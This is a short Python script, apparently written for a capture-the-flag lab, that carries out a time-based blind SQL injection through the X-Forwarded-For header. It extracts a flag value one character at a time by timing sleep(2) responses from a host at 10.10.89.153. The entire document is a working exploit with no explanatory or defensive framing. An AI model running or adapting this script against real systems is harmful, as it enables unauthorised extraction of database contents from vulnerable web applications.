#MarCorei7 Script SQLi-blind Time based

import requests
import string
import time

url = "http://10.10.89.153"

flag = ""
counter = 1

chars = "{" + "}" + ":"
chars += string.ascii_letters
chars += string.digits

payload = f"1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '2') and '1'='1"

headers = {'X-Forwarded-For':payload}

while True:
	for i in chars:
		payload = f"1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '{i}') and '1'='1"
		headers = {'X-Forwarded-For':payload}
		start_time = time.time()
		r = requests.get(url, headers = headers)
		end_time = time.time()
		if end_time-start_time >= 2:
			flag += i
			counter += 1
			print(flag)
			break
